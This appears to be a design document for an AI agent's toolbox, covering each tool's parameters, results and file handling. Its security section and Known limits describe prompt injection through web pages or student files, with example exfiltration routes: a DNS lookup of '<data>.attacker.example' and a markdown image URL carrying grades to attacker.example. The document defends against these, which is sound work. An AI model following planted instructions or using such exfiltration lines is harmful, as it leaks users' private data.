# Tools

Every tool is ours, a function tool the caller runs. No provider-hosted tools, ever. The loop
that runs them sits beside llm_master, not under it (SPEC.md). This page is the roster, what
each tool takes, and what it hands back. The code lives in `agent/`.

| tool | group | runs on | result |
|---|---|---|---|
| read | sandbox (Modal) | sandbox | text, image (image files, rendered PDF and document pages) |
| write | sandbox | sandbox | text |
| edit | sandbox | sandbox | text |
| bash | sandbox | sandbox | text |
| run_program | sandbox, programmatic tool calling | sandbox, calling back to the host | text |
| web_search | web (Exa) | host | text |
| fetch_url | web (Exa) | host | text |
| generate_image | generation | host | text and image |
| generate_audio | generation | host | text (the audio file goes to the user) |
| deliver_file | delivery | host | text |
| todo | loop | host | text |
| ask_user | loop | the user | text |

file_search, search_uflo_docs, mcp and widget come later; they aren't designed here.

`generate_image` makes an image with llm_master's `image()`, or edits one: the parent image and
the new instruction go out together, and a small record beside each image names its parent.
`generate_audio` is one-shot speech through `speech()`. Both run openai first with gemini as the
fallback.

Citations are text. A result is text, or text and images; nothing else. No API takes audio
inside a tool result, so audio never comes back as one.

The model may follow instructions planted in a web page or a student's submission, and the code
it writes may too. Three rules keep the conversation's data in:

- The sandbox holds no credentials and has no network. Modal's domain allowlist would leave DNS
  open, and a lookup of `<data>.attacker.example` carries data out, so the image carries every
  package the tools and skills need instead. Exa, Modal and provider keys stay on the host.
- `fetch_url` reads only URLs the user wrote or Exa returned, close to Anthropic's rule for its
  own web fetch tool, so the model can't build a URL that carries data out. URLs in other tools'
  output don't count: the model can print any URL with `bash`.
- The browser never loads a URL the model wrote. The UI shows images in answers only from the
  files origin, where the caller hosts what the tools made, and the app page's content security
  policy enforces it (`img-src`, and `script-src` without `'unsafe-inline'`). Files come from
  that separate origin, HTML and SVG only as downloads. Otherwise a markdown image like
  `![](https://attacker.example/?d=<grades>)` would send data out the moment it renders.

Every path, including the ones host tools take, names a file in the sandbox.

## Running tools

The caller builds a `Toolbox` for each request of a conversation. It lists the tools for the
config and runs the model's calls:

```python
from agent import Toolbox

def lookup_grade(student: str) -> str:
    """The student's current grade in this course."""
    ...

box = Toolbox("conv_8f2", tools=[lookup_grade], sources=saved_sources, urls=user_urls, llm=llm)
config = Config(tools=box.specs)  # on each candidate: Model(..., config=config)
response = await llm.query(...)
history.append(response.message)
for call in response.message.calls:
    result = await box.run(call["name"], call["arguments"])
    if result.waiting:
        continue  # the browser asks the user; the reply comes with the next request
    history.append({"role": "tool", "call_id": call["id"], "content": result.content})
await box.aclose()
```

On the next request, the reply finishes the waiting call before anything else joins the history:
`result = await box.resume(call["name"], call["arguments"], reply)`. A request that brings no
reply, such as a new message instead of an answer, declines every waiting call first with None.

- The caller runs one request per conversation at a time. The one-at-a-time rule for sandbox
  changes lives in the toolbox, so two requests at once could race on the same files.
- The first argument is the conversation's id, which names its sandbox and volume.
- `box.specs` lists the built-in tools, then the caller's own, as openai function dicts.
- A custom tool is a plain Python function, sync or async. Its schema comes from its signature
  and docstring through any-llm's `callable_to_tool`, as in CONFIG.md field 6. It returns a
  string, raises `ToolError` to tell the model it failed, and runs through the same `run` as
  every built-in. A sync one runs in a worker thread, so it never blocks the event loop.
- Every call's arguments are checked against the tool function's type hints (pydantic's
  `validate_call`) before it runs, so a wrong type is an error the model can fix.
- `run` returns a `Result`:
  - `content`: the tool message's content, a string or text and image parts (IO.md).
  - `files`: `UserFile(name, mime, data)` records for the user, from `deliver_file` and the
    `generate_*` pair. The caller hosts the bytes on a separate origin, or as downloads, and
    sends AI SDK `file` parts.
  - `sources`: AI SDK `source-url` parts, ready to forward. Their `sourceId` is the number the
    model cites.
  - `error`: true when the tool failed. `content` then says why, so the model can recover, and
    the caller can mark the call failed in the UI.
  - `waiting`: `"question"` from `ask_user`. The call has no result yet. The browser asks the
    user (AI SDK's client-side tools), and `resume` finishes the call with the reply: the answers
    keyed by question, or None when the user declined.
- Every failure comes back as an error result, so each call gets its answer and the history stays
  valid. A failure the model caused (a missing file, an edit that doesn't match, bad arguments)
  is a `ToolError` and reads as its message. Any other exception (Modal or Exa down, a bug) reads
  as the tool and the exception's type only, since its message can hold what the model mustn't
  see, and the toolbox logs it with its traceback.
- Calls may run in parallel. The toolbox runs the ones that change the sandbox (`write`, `edit`,
  `bash`, `run_program`) one at a time, so two edits to one file can't lose each other.
- When the user stops a turn, the loop answers each unanswered call with `Stopped by the user.`
  so the history stays valid. A command already running in the sandbox runs on to its timeout.
- Source numbers continue across the conversation. The caller stores the source parts it sends
  and passes them back when it rebuilds the toolbox. A URL seen before keeps its number.
- `urls` are the URLs the user typed in their messages, not ones inside attachments. With the
  URLs Exa returns, they are all that `fetch_url` reads; both come back on a rebuild, `urls` from
  the messages and Exa's from `sources`.
- `llm` is llm_master's facade, for the `generate_*` pair.
- `aclose()` closes the toolbox's HTTP clients. The sandbox outlives it.

## Shapes

Each tool copies a precedent the models already know, chosen once for every provider. The
tables give each parameter; the JSON schemas in `agent/` are the exact spelling, written by hand
to keep the precedents' wording, and a test keeps each in step with its function's parameters. A
value a tool can't take, such as a timeout over 600 seconds, is an error result.

Rules every tool shares:

- **Paths** are relative to `/workspace`, the conversation's folder in its sandbox, or absolute.
  Only `/workspace` survives the sandbox stopping.
- **Long text** is cut at 2000 lines or 50 KB, whichever comes first (pi's limits), and the
  notice says how to read on. `read` pages through the file itself. `bash` and `run_program` keep
  the end of their output, and every other tool, a custom one included, keeps the start. The
  full text waits under `/workspace/.agent/` for `read`. Calls inside a program are not cut: the
  program sees everything, and only what it prints reaches the model.
- **Citations** are numbers. `web_search` and `fetch_url` number their sources, one count across
  the conversation, and the model writes `[3]` where it uses source 3.
- **Images** a tool returns are at most 1568 px on the long side. That stays under the 2000 px
  Anthropic allows once a request holds more than 20 images, and a page costs Claude about 2,200
  tokens. Photos and rendered pages go as JPEG, so a 10-page render is about 1 MB; an image with
  transparency stays PNG.

### read

pi's `read`, extended to the file kinds a teacher's files come in.

| parameter | type | meaning |
|---|---|---|
| path | string, required | the file |
| offset | integer | first line to read, 1-indexed; for PDFs and documents, the first page |
| limit | integer | how many lines to read; for PDFs and documents, how many pages (at most 10) |

What comes back depends on the file:

| file | result |
|---|---|
| text and code | the raw text, no line numbers. A cut ends with pi's notice, e.g. `[Showing lines 1-2000 of 5120. Use offset=2001 to continue.]` |
| image (png, jpg, gif, webp; bmp, tiff and heic convert) | `Read image file [image/jpeg]` and the image |
| PDF | `Rendered report.pdf [pages 1-10 of 42]` and one image per page (pdftoppm) |
| document (docx, doc, odt, rtf, pptx, ppt, odp) | the same, after LibreOffice turns it into a PDF, with a profile of its own so parallel renders don't collide. This is how the model checks the files it builds |
| spreadsheet (xlsx, xls, ods, csv, tsv) | every sheet as CSV under a `## <sheet>` heading, when it all fits in 25 KB. Larger: the first 20 rows of each sheet, its size, and a note that the full data stays in the sandbox for `bash` or `run_program`. A formula cell with no saved value, as in a workbook the model just built, shows its formula |
| audio, video | an error: read can't return them |

A missing file returns `File not found: <path>`; a directory or a binary file returns an error
that points at `bash`.

A PDF comes back as page images, not as a PDF part. any-llm moves only images into a Gemini tool
result, so a PDF part would reach Gemini as base64 text. Page images work on every provider that
takes images, and their size is known.

### write

pi's `write`. Parent folders are created.

| parameter | type | meaning |
|---|---|---|
| path | string, required | the file, created or overwritten |
| content | string, required | the whole new content |

Returns `Successfully wrote to <path>`.

### edit

pi's `edit`, field for field.

| parameter | type | meaning |
|---|---|---|
| path | string, required | the file |
| edits | array, required | one or more `{oldText, newText}` replacements |
| edits[].oldText | string | exact text to replace. It must appear exactly once in the original file and must not overlap another edit |
| edits[].newText | string | its replacement |

Every edit matches against the original file, not one after another. Matching is exact after
line endings are normalized to LF; the file keeps its own line endings and BOM. pi also falls
back to a fuzzy match (smart quotes, dashes, trailing spaces); we leave that out until misses
show up in practice. The model sees `Successfully replaced 2 block(s) in <path>.` and no diff.
Failures use pi's wording, which reads "the text" instead of "edits[i]" when there is one edit:

- `Could not find edits[1] in <path>. The oldText must match exactly including all whitespace and newlines.`
- `Found 3 occurrences of edits[0] in <path>. Each oldText must be unique. Please provide more context to make it unique.`
- `edits[0] and edits[1] overlap in <path>. Merge them into one edit or target disjoint regions.`
- `No changes made to <path>. The replacements produced identical content.`

Like pi, we accept two input mistakes real models make: `edits` sent as a JSON string, and one
edit object without the array.

### bash

pi's `bash`, with Claude Code's default and ceiling on the timeout, because a hosted sandbox
can't wait forever.

| parameter | type | meaning |
|---|---|---|
| command | string, required | runs with `bash -c` in `/workspace`, a fresh shell each call |
| timeout | number | seconds, default 120, at most 600 |

The result is stdout and stderr interleaved, cut from the top so the end survives. The output
goes to a file in the sandbox and only its tail comes back, so a command that prints gigabytes
costs the host nothing. When cut, the notice names the file:
`[Showing lines 3001-5000 of 5000. Full output: .agent/bash-1f3a.log]`. Empty output reads
`(no output)`. A failure appends `Command exited with code 2` or
`Command timed out after 120 seconds`, and a timeout kills everything the command started.

### run_program

Anthropic's programmatic tool calling, run in our sandbox. The model writes Python that calls
tools, and only what the program prints comes back, so intermediate results never fill the
context.

| parameter | type | meaning |
|---|---|---|
| code | string, required | a Python program, run in `/workspace` |
| timeout | number | seconds, default 120, at most 600, inner calls included |

Inside the program the host's tools are async functions, as in Anthropic's version: each takes
one dict of arguments and returns the result's text in full. Top-level `await` works, and
`asyncio.gather` runs calls in parallel:

```python
pages = await asyncio.gather(*[web_search({"query": q, "objective": "..."}) for q in queries])
print(max(pages, key=len)[:2000])
```

- **Which tools.** Anthropic makes each tool opt in; ours is a fixed list: `web_search`,
  `fetch_url`, `generate_image`, `generate_audio`, `deliver_file`, and every custom tool. The
  program has the filesystem and a shell itself, so the sandbox tools stay out. So do `todo` and
  `ask_user`, which draw UI.
- **Failures.** A failed call raises `ToolError` in the program, so code can't mistake an error
  for data; `asyncio.gather(..., return_exceptions=True)` keeps the calls that worked. A program
  gets at most 100 calls; the next one raises.
- **The bridge.** The runner sends each call as one JSON line on its original stdout and reads
  the reply on stdin; the program's prints go to a log. The bridge only separates calls from
  output. The program shares the runner's process and can send any line, so the host checks
  every call against the list above and the call cap. Calls still running when the program ends
  are cancelled. Keys never enter the sandbox.
- **The result** reads like `bash`: output interleaved, cut from the top, and
  `Program exited with code 1` on failure. Files and sources from the calls inside still reach
  the user and the UI.

### web_search

Exa's own tool definition (exa-py's `exa.tools.web_search`), with depth added as Exa's `type`.

| parameter | type | meaning |
|---|---|---|
| query | string, required | a semantically rich description of the ideal page, not keywords |
| objective | string, required | Exa's wording, verbatim: "Goal for this search turn; say which documents should rank first, which should be excluded, and what specific facts or figures to pull from them." |
| type | `auto` or `deep`, default `auto` | `deep` runs Exa's multi-step search: 4–15 s instead of about 1 s, $12 instead of $7 per 1000 |

Depth is a parameter, not a second tool. Exa puts depth on one endpoint as `type`, and its MCP
server retired its separate `deep_search_exa` tool. Exa's helpers fix `type` at `auto`; we let
the model pick `deep` because the research skill calls for deep searches. `fast`, `instant`,
`deep-lite` and `deep-reasoning` stay out: Exa sends long research to its Agent instead of
`deep-reasoning`, and the others trade quality for latency the model can't judge.

Every call asks Exa for 10 results with highlights, Exa's recommended baseline. Each result
comes back numbered:

```
[4] Title: Photosynthesis - Light reactions
URL: https://example.org/photosynthesis
Published: 2025-03-14
Author: J. Rivera
Highlights:
The light reactions take place in the thylakoid membrane...
```

Results are joined by `---`. Exa's `notices` follow them; its `warnings` never reach the model,
as Exa asks. No results reads `No search results found.` Each result adds a `source-url` part.

### fetch_url

Exa's contents tool (exa-py's `exa.tools.get_contents`), under our roster name.

| parameter | type | meaning |
|---|---|---|
| urls | array of strings, required | absolute URLs; several are read in one call |

It reads only URLs the user wrote and URLs that earlier `web_search` and `fetch_url` results
returned. Anything else is an error that points at `web_search`; a link inside a page is found
again by searching. Each page comes back numbered like a search result, with its whole text in
place of highlights, and the long-text rule cuts the result. A page that fails reads
`Error fetching <url>: <reason>`, and the others still return.

### generate_image

| parameter | type | meaning |
|---|---|---|
| prompt | string, required | what to make, or how to change the image |
| image | string | the path of an image to edit; omitted makes a new one |

An edit sends the parent image and the prompt as one request (SPEC.md, Media). The new image is
saved as `images/<id>.<ext>`, the extension from the mime type `image()` returns, with
`images/<id>.json` beside it holding the parent's path (or null), the prompt, and the candidate
that made it. The model gets `Saved images/<id>.png` and the image; the user gets the image. No
size parameter: `image()` takes none, and the prompt can ask for a shape.

### generate_audio

| parameter | type | meaning |
|---|---|---|
| text | string, required | exactly what to say, at most 4096 characters (OpenAI's limit) |

The speech is saved as `audio/<id>.<ext>`, the extension from the mime type `speech()` returns
(mp3 from openai, wav from gemini), and goes to the user. The model gets
`Saved audio/<id>.mp3 and sent it to the user.`

The pair needs llm_master's facade, so the caller passes it: `Toolbox(..., llm=llm)`.

### deliver_file

| parameter | type | meaning |
|---|---|---|
| path | string, required | the file to send to the user |

Returns `Sent report.docx to the user.` Several files take several calls, which models make in
parallel.

### todo

Codex's `update_plan`, under our roster name. It is the simpler of the two precedents: two
fields per item, where Claude Code's `TodoWrite` needs a third (`activeForm`, the spinner text).

| parameter | type | meaning |
|---|---|---|
| explanation | string | why the plan changed |
| plan | array, required | the whole list, every call |
| plan[].step | string | the step's text |
| plan[].status | `pending`, `in_progress` or `completed` | at most one step is `in_progress`, as the description asks; not enforced |

Returns `Plan updated`. The tool keeps no state: the UI draws the list from the latest call's
arguments, and the model sees its own last call in the history.

### ask_user

Claude Code's `AskUserQuestion`, without its terminal-only `preview` field.

| parameter | type | meaning |
|---|---|---|
| questions | array of 1–4, required | the questions, shown together; each question's text is unique |
| questions[].question | string | the full question, ending with a question mark |
| questions[].header | string | a chip label of at most 12 characters |
| questions[].options | array of 2–4 | the choices; the UI adds a free-text "Other" itself |
| questions[].options[].label | string | 1–5 words |
| questions[].options[].description | string | what the choice means |
| questions[].multiSelect | boolean | whether several options may be picked |

The user answers this tool, not the toolbox: `run` comes back waiting for a question, the loop
ends the turn, and the browser shows the questions (AI SDK's client-side tools). The answers
come back with the next request, and `box.resume("ask_user", arguments, answers)` finishes the
call, with the answers keyed by question and multi-select ones joined by commas, or None when the
user declined. The model then reads Claude Code's text:

`User has answered your questions: "Which grade level?"="Grade 9". You can now continue with the user's answers in mind.`

No answers reads `User declined to answer questions`.

## Files

The caller hands each upload to `box.attach(name, data)`. It saves the file under `uploads/`
(a taken name gets a number: `notes (2).pdf`) and returns the user message's parts: the path,
so every tool can reach the file, and what else the model gets, under the same caps as `read`:

| upload | in the user message | otherwise |
|---|---|---|
| image | the image, at most 1568 px | |
| PDF up to 10 pages and 5 MB | the PDF | |
| audio up to 10 minutes and 20 MB | the audio | |
| spreadsheet up to 25 KB | the sheets as CSV | |
| larger PDF, docx, pptx | the path only | `read` renders it page by page (`offset` and `limit` count pages) |
| longer audio | the path only | nothing can listen to it yet |
| larger spreadsheet | a preview | the data stays in the sandbox |
| text and code | the path only | `read` pages through it |
| video | not supported | |

## Known limits

- Images and PDFs stay in the history, and every later call resends them: each rendered page
  costs its tokens again on every step. Anthropic caps a request at 32 MB and Gemini's inline
  data at 100 MB, so a long session that renders many documents can hit Anthropic's cap. Dropping
  old images would rewrite history and miss the prompt cache, so nothing drops them yet; the
  `offset` and `limit` on `read` keep each render small.
- Fireworks takes text only in tool results (IO.md), so the first image a tool returns takes
  Fireworks candidates out of the fallback chain.
- Anthropic takes at most 100 images per request on its 200k-context models, so a long session
  of renders can outgrow those models before it reaches the byte cap.
- A planted instruction can still put data into a search query, which reaches Exa, not the
  attacker. The seen-URL rule for `fetch_url` closes the direct route out, not every route.
- Routes that need the user remain: a markdown link the user clicks, and a downloaded HTML file
  the user opens.
- A short audio upload goes into the user message as audio, which Anthropic, OpenAI's Responses
  API and Fireworks don't take (IO.md). From then on only Gemini and OpenAI's audio models can
  answer.
